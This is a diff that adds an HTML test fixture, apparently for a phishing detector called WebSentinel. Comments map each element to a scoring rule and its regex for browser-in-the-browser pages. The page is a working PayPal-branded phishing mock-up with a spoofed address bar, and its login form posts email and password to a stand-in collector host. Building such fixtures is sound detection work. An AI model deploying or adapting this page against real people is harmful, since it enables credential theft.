@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<!--
+  WebSentinel — BitB Anomaly Score Test Page (100%)
+  EDUCATIONAL / RESEARCH USE ONLY
+
+  L1 target heuristic: 1.00  (raw sum 1.25, capped)
+  Triggers ALL 5 rules:
+    Rule 1 (+0.40): <iframe style="position:fixed;top:0;left:0;width:100vw;height:100vh;...">
+    Rule 2 (+0.20): z-index:99999 on .fake-browser-window in CSS
+    Rule 3 (+0.20): width:100vw + height:100vh both present (bg-page AND iframe style)
+    Rule 4 (+0.15): ondragstart="return false" onselectstart="return false" on <body>
+                    + user-select:none in CSS
+    Rule 5 (+0.30): <span class="browser-bar"> in the fake address bar
+
+  Theme: PayPal (distinct from the Microsoft theme in bitb_test.html)
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <title>PayPal - Log In to Your Account</title>
+  <link rel="icon" href="https://www.paypal.com/favicon.ico"/>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #001435;
+      font-family: 'PayPal Sans', Arial, sans-serif;
+      user-select: none;    /* RULE 4: user-select:none +0.15 */
+      overflow: hidden;
+    }
+
+    /*
+      Background page.
+      RULE 3 TRIGGER (+0.20): width:100vw AND height:100vh both present here.
+      The iframe style below also carries both, giving double confirmation.
+    */
+    .bg-page {
+      width: 100vw;          /* Rule 3: width:100vw present */
+      height: 100vh;         /* Rule 3: height:100vh present */
+      background: linear-gradient(180deg, #001435 0%, #003087 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #a0aec0;
+      font-size: 14px;
+    }
+
+    /* Fake browser window overlay div */
+    .fake-browser-window {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 480px;
+      height: 600px;
+      z-index: 99999;        /* RULE 2: z-index:99999 +0.20 */
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 24px 80px rgba(0,0,0,0.85);
+    }
+
+    /* Fake browser chrome */
+    .fake-chrome {
+      background: #e8eaed;
+    }
+
+    .fake-titlebar {
+      background: #dee1e6;
+      display: flex;
+      align-items: center;
+      padding: 6px 10px;
+      gap: 8px;
+      border-bottom: 1px solid #ccc;
+      height: 44px;
+    }
+
+    .fake-dots span {
+      display: inline-block;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      margin-right: 4px;
+    }
+    .dot-red    { background: #ff5f57; }
+    .dot-yellow { background: #febc2e; }
+    .dot-green  { background: #28c840; }
+
+    /* Address bar container */
+    .fake-address-bar {
+      background: #fff;
+      border: 1px solid #c6c9cd;
+      border-radius: 20px;
+      flex: 1;
+      display: flex;
+      align-items: center;
+      padding: 3px 10px;
+      font-size: 12px;
+      color: #202124;
+      gap: 6px;
+      height: 28px;
+    }
+
+    .lock-icon { color: #188038; font-size: 12px; flex-shrink: 0; }
+
+    /*
+      RULE 5 TRIGGER (+0.30): class="browser-bar"
+      Regex (fake.*address|address.*bar|browser.*bar) matches "browser-bar"
+    */
+    .browser-bar {
+      flex: 1;
+      color: #202124;
+      font-size: 12px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    /* Fake page content area */
+    .fake-page-content {
+      background: #fff;
+      width: 100%;
+      height: calc(100% - 44px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 32px;
+    }
+
+    /* PayPal branding */
+    .paypal-logo {
+      font-size: 30px;
+      font-weight: 700;
+      color: #003087;
+      margin-bottom: 8px;
+      letter-spacing: -1px;
+    }
+    .paypal-logo .accent { color: #009cde; }
+
+    h2 {
+      font-size: 22px;
+      font-weight: 600;
+      color: #2c2e2f;
+      margin-bottom: 6px;
+    }
+
+    .subtitle {
+      font-size: 13px;
+      color: #6c7378;
+      margin-bottom: 24px;
+    }
+
+    .form-group { width: 100%; margin-bottom: 14px; }
+
+    .form-group input {
+      width: 100%;
+      border: 1px solid #c7cdd1;
+      border-radius: 4px;
+      padding: 11px 12px;
+      font-size: 14px;
+      outline: none;
+      color: #2c2e2f;
+      font-family: inherit;
+    }
+
+    .form-group input:focus { border-color: #0070ba; }
+
+    .btn-login {
+      width: 100%;
+      background: #0070ba;
+      color: #fff;
+      border: none;
+      border-radius: 24px;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 8px;
+      letter-spacing: 0.5px;
+    }
+
+    .btn-login:hover { background: #003087; }
+
+    .disclaimer {
+      font-size: 10px;
+      color: #9da3a7;
+      text-align: center;
+      margin-top: 18px;
+    }
+  </style>
+</head>
+<!--
+  RULE 4 TRIGGER (+0.15): ondragstart + onselectstart on <body>
+  Also covered by user-select:none in CSS above (triple-redundant for Rule 4).
+-->
+<body ondragstart="return false" onselectstart="return false">
+
+  <!-- Background visible around popup -->
+  <div class="bg-page">
+    <p>Redirecting to PayPal secure server...</p>
+  </div>
+
+  <!-- Fake browser window overlay (div, not iframe) -->
+  <div class="fake-browser-window">
+
+    <!-- Fake browser chrome with spoofed address bar -->
+    <div class="fake-chrome">
+      <div class="fake-titlebar">
+        <div class="fake-dots">
+          <span class="dot-red"></span>
+          <span class="dot-yellow"></span>
+          <span class="dot-green"></span>
+        </div>
+        <div class="fake-address-bar">
+          <span class="lock-icon">&#128274;</span>
+          <!-- RULE 5 TRIGGER: class="browser-bar" -->
+          <span class="browser-bar">https://www.paypal.com/signin</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- PayPal-branded phishing form -->
+    <div class="fake-page-content">
+      <div class="paypal-logo">Pay<span class="accent">Pal</span></div>
+      <h2>Log In</h2>
+      <p class="subtitle">to your PayPal account</p>
+
+      <form action="http://attacker-collector.xyz/steal" method="POST">
+        <input type="hidden" name="campaign" value="bitb-anomaly-100"/>
+        <div class="form-group">
+          <input type="email" name="email"
+                 placeholder="Email address" autocomplete="off"/>
+        </div>
+        <div class="form-group">
+          <input type="password" name="password"
+                 placeholder="Password" autocomplete="off"/>
+        </div>
+        <button type="submit" class="btn-login">Log In</button>
+      </form>
+
+      <p class="disclaimer">
+        [WebSentinel Test Page — L1 Target: 1.00 — Not a real PayPal page]
+      </p>
+    </div>
+
+  </div>
+
+  <!--
+    RULE 1 TRIGGER (+0.40): <iframe> with inline style="position:fixed..."
+    Regex: <iframe[^>]*style=["'][^"']*position\s*:\s*fixed
+
+    RULE 2 TRIGGER (+0.20): z-index:99999 also in .fake-browser-window CSS;
+    this iframe adds z-index:99998 (distinct from the div's 99999).
+
+    RULE 3 TRIGGER (+0.20): width:100vw AND height:100vh present in this style attribute.
+    Both were already present in the .bg-page CSS above; the iframe reinforces them.
+  -->
+  <iframe
+    src="about:blank"
+    style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:99998;pointer-events:none;"
+  ></iframe>
+
+</body>
+</html>
